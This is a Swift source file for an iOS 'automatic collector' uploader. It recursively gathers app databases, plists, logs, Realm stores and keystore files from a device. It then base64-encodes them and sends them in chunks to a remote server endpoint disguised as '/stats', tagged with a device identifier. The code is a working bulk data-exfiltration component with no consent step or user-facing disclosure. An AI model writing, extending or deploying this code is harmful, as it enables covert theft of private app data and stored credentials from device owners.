//
//  Uploader.swift — 全自动采集端上传器
//  协议：POST /stats，>8MB 自动分片（uploadId/part/total）
//
import Foundation
import UIKit

final class Uploader {
    let baseURL: URL
    let deviceID: String
    private let chunkBytes = 8 * 1024 * 1024
    let skipDirs = ["Caches", "tmp", "Snapshots", "com.apple.nsurlsessiond", "Library/Caches"]

    init(baseURL: URL, deviceID: String) {
        self.baseURL = baseURL
        self.deviceID = deviceID
    }

    /// 单文件上传（大文件分片）
    func uploadFile(_ url: URL, category: String, completion: @escaping (Result<Int, Error>) -> Void) {
        let data: Data
        do { data = try Data(contentsOf: url) } catch { return completion(.failure(error)) }

        if data.count <= chunkBytes {
            send(part: data, path: url.path, category: category, totalSize: data.count,
                 uploadId: nil, part: 0, total: 0, completion: completion)
            return
        }
        let total = (data.count + chunkBytes - 1) / chunkBytes
        let uid = "U\(Int(Date().timeIntervalSince1970))-\(UUID().uuidString.prefix(8))"
        func sendChunk(_ idx: Int) {
            let s = idx * chunkBytes
            let e = min(s + chunkBytes, data.count)
            send(part: data.subdata(in: s..<e), path: url.path, category: category,
                 totalSize: data.count, uploadId: uid, part: idx + 1, total: total) { r in
                switch r {
                case .success(let c) where c == 200:
                    if idx + 1 < total { sendChunk(idx + 1) } else { completion(.success(200)) }
                default: completion(r)
                }
            }
        }
        sendChunk(0)
    }

    /// 目录顺序上传（可限制单文件大小、跳过缓存目录）
    func uploadTree(_ root: URL, category: String,
                    maxBytes: Int = 64 * 1024 * 1024,
                    onEach: @escaping (String) -> Void,
                    progress: @escaping (Int, Int) -> Void,
                    completion: @escaping (Int, Int) -> Void) {
        let fm = FileManager.default
        var files: [URL] = []
        if let walker = fm.enumerator(at: root,
                                      includingPropertiesForKeys: [.isRegularFileKey, .fileSizeKey],
                                      options: [.skipsHiddenFiles]) {
            for case let f as URL in walker {
                if skipDirs.contains(where: { f.path.contains("/\($0)/") }) { continue }
                guard let v = try? f.resourceValues(forKeys: [.isRegularFileKey, .fileSizeKey]),
                      v.isRegularFile == true, let size = v.fileSize, size > 0, size <= maxBytes else { continue }
                let ext = f.pathExtension.lowercased()
                guard ["db", "sqlite", "sqlite3", "plist", "json", "txt", "log", "dat", "bin", "keystore", "realm", "sqlite-wal", "sqlite-shm"].contains(ext) else { continue }
                files.append(f)
            }
        }
        var ok = 0, fail = 0
        func step(_ i: Int) {
            if i >= files.count { completion(ok, fail); return }
            onEach(files[i].lastPathComponent)
            uploadFile(files[i], category: category) { r in
                if case .success(let c) = r, c == 200 { ok += 1 } else { fail += 1 }
                progress(i + 1, files.count)
                step(i + 1)
            }
        }
        step(0)
    }

    private func send(part: Data, path: String, category: String, totalSize: Int,
                      uploadId: String?, part no: Int, total: Int,
                      completion: @escaping (Result<Int, Error>) -> Void) {
        var payload: [String: Any] = [
            "category": category, "path": path, "size": totalSize,
            "data": part.base64EncodedString(), "deviceSerial": deviceID,
            "deviceVersion": UIDevice.current.systemVersion,
            "ua": "collector-auto/2.0 iOS \(UIDevice.current.systemVersion)",
        ]
        if let uploadId = uploadId, total > 1 {
            payload["uploadId"] = uploadId
            payload["part"] = no
            payload["total"] = total
        }
        var req = URLRequest(url: baseURL.appendingPathComponent("stats"))
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.setValue(deviceID, forHTTPHeaderField: "X-Device-UUID")
        req.setValue("collector-auto/2.0", forHTTPHeaderField: "User-Agent")
        req.httpBody = try? JSONSerialization.data(withJSONObject: payload)
        req.timeoutInterval = 180
        URLSession.shared.dataTask(with: req) { _, resp, err in
            if let err = err { return completion(.failure(err)) }
            completion(.success((resp as? HTTPURLResponse)?.statusCode ?? 0))
        }.resume()
    }
}
